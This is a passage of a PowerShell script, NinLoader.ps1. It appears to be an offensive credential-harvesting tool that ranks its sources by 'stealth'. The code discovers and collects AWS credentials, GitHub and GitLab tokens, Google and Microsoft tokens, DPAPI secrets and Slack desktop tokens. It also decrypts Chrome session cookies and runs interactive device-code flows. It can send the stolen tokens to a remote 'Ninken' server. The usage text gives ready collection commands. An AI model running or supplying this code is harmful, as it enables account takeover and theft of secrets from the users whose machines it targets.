    $allResults += New-DiscoveryResult -Service "microsoft" -Source "foci_device_code" `
        -StealthScore 3 -Details "interactive FOCI device code flow (stdlib, no msal needed)"
    $allResults += New-DiscoveryResult -Service "google" -Source "device_code" `
        -StealthScore 3 -Details "interactive OAuth device code flow"

    foreach ($svc in $collectors.Keys) {
        if ($Service -and $svc -ne $Service) { continue }
        try {
            $allResults += & $collectors[$svc]
        }
        catch {
            Write-Host "[WARN] $svc discovery failed: $_" -ForegroundColor Yellow
        }
    }

    # Display results (matches Python format_table output)
    if ($allResults.Count -eq 0) {
        Write-Host "No token sources discovered." -ForegroundColor Yellow
    }
    else {
        Write-Host ("{0,-12} {1,-20} {2,-8} {3,-30} {4}" -f "Service", "Source", "Stealth", "Account", "Path") -ForegroundColor White
        Write-Host ("-" * 100) -ForegroundColor Gray

        foreach ($r in $allResults) {
            $acct = if ($r.AccountHint) { $r.AccountHint } else { "" }
            $pathStr = if ($r.Path) { $r.Path } else { "" }
            $details = if ($r.Details) { " ($($r.Details))" } else { "" }

            $color = if ($r.StealthScore -ge 4) { "Green" } else { "Yellow" }
            Write-Host ("{0,-12} {1,-20} {2,-8} {3,-30} {4}{5}" -f `
                $r.Service, $r.Source, $r.StealthScore, `
                $acct, $pathStr, $details) -ForegroundColor $color
        }

        Write-Host "`nTotal: $($allResults.Count) token source(s) found" -ForegroundColor Cyan
    }
}
elseif ($Collect) {
    # -- Collection mode --
    $allTokens = @()

    # Handle interactive source-specific collectors
    if ($Service -eq "microsoft" -and ($Source -eq "device_code" -or $Source -eq "foci_device_code")) {
        $allTokens += Invoke-MicrosoftDeviceCode -TenantId $Tenant -ClientName $Client
    }
    elseif ($Service -eq "google" -and $Source -eq "gws_cli") {
        $allTokens += Invoke-GwsOAuth
    }
    elseif ($Source -eq "browser") {
        # Browser cookie extraction for any service
        $hostMap = @{
            "google" = @(".google.com")
            "slack"  = @(".slack.com")
            "github" = @(".github.com")
            "gitlab" = @(".gitlab.com")
        }
        $svc = if ($Service) { $Service } else { "google" }
        $patterns = if ($hostMap.ContainsKey($svc)) { $hostMap[$svc] } else { @(".$svc.com") }
        Write-Host "Extracting Chrome cookies for $svc (hosts: $($patterns -join ', '))..." -ForegroundColor Cyan
        $cookies = Get-ChromeCookies -HostPatterns $patterns
        if ($cookies -and $cookies.Count -gt 0) {
            Write-Host "Decrypted $($cookies.Count) cookie(s) from Chrome." -ForegroundColor Green
            $cookieDict = @{}
            foreach ($c in $cookies) {
                $cookieDict["$($c.Host)::$($c.Name)"] = $c.Value
            }
            $allTokens += New-TokenResult -Service $svc -Source "browser" `
                -StealthScore 2 -AccessToken ($cookieDict | ConvertTo-Json -Compress) `
                -Extra @{ cookie_count = $cookies.Count; browser = "chrome"; raw_cookies = $cookies }
        }
        else {
            Write-Host "No cookies found/decrypted for $svc." -ForegroundColor Yellow
        }
    }
    else {
        $collectors = @{
            "aws"       = { Get-AwsCredentials }
            "github"    = { Get-GitHubTokens }
            "gitlab"    = { Get-GitLabTokens }
            "google"    = { Get-GoogleTokens }
            "microsoft" = { Get-MicrosoftTokens }
            "slack"     = { Get-SlackTokens }
        }

        if ($Service) {
            if ($collectors.ContainsKey($Service)) {
                try {
                    $allTokens += & $collectors[$Service]
                }
                catch {
                    Write-Host "[WARN] $Service collection failed: $_" -ForegroundColor Yellow
                }
            }
            else {
                Write-Host "Error: Unknown service '$Service'" -ForegroundColor Red
                Write-Host "Available services: aws, github, gitlab, google, microsoft, slack" -ForegroundColor Gray
                exit 1
            }
        }
        else {
            # All services -- skip interactive collectors in batch mode (stealth < 4)
            foreach ($svc in $collectors.Keys) {
                try {
                    $allTokens += & $collectors[$svc]
                }
                catch {
                    Write-Host "[WARN] $svc collection failed: $_" -ForegroundColor Yellow
                }
            }
        }
    }

    Write-TokenOutput -Tokens $allTokens -OutputType $Output -OutputPath $Path -NinkenUrl $NinkenUrl
    Write-Host "`nCollected $($allTokens.Count) token(s)." -ForegroundColor Cyan
}
else {
    Write-Host "Usage: .\NinLoader.ps1 -Discover [-Service <name>]" -ForegroundColor White
    Write-Host "       .\NinLoader.ps1 -Collect [-Service <name>] [-Source <name>] [-Output <type>]" -ForegroundColor White
    Write-Host ""
    Write-Host "Services: aws, google, github, gitlab, microsoft, slack" -ForegroundColor Gray
    Write-Host "Sources:" -ForegroundColor Gray
    Write-Host "  github:    gh_cli, git_credentials, credential_manager, env" -ForegroundColor Gray
    Write-Host "  gitlab:    pat (config, env, credential_manager, .netrc)" -ForegroundColor Gray
    Write-Host "  google:    adc, gcloud, gws_cli (interactive OAuth)" -ForegroundColor Gray
    Write-Host "  microsoft: dpapi, credential_manager, device_code / foci_device_code (interactive)" -ForegroundColor Gray
    Write-Host "  aws:       credentials, env, sso_cache" -ForegroundColor Gray
    Write-Host "  slack:     desktop" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Outputs:  stdout, file, clipboard, ninken" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Examples:" -ForegroundColor Cyan
    Write-Host "  .\NinLoader.ps1 -Discover" -ForegroundColor White
    Write-Host "  .\NinLoader.ps1 -Collect -Service github -Output file" -ForegroundColor White
    Write-Host "  .\NinLoader.ps1 -Collect -Service gitlab -Output stdout" -ForegroundColor White
    Write-Host "  .\NinLoader.ps1 -Collect -Service microsoft -Source foci_device_code -Client office" -ForegroundColor White
    Write-Host "  .\NinLoader.ps1 -Collect -Service google -Source gws_cli" -ForegroundColor White
    Write-Host "  .\NinLoader.ps1 -Collect -Output ninken -NinkenUrl https://ninken.local:3000" -ForegroundColor White
}
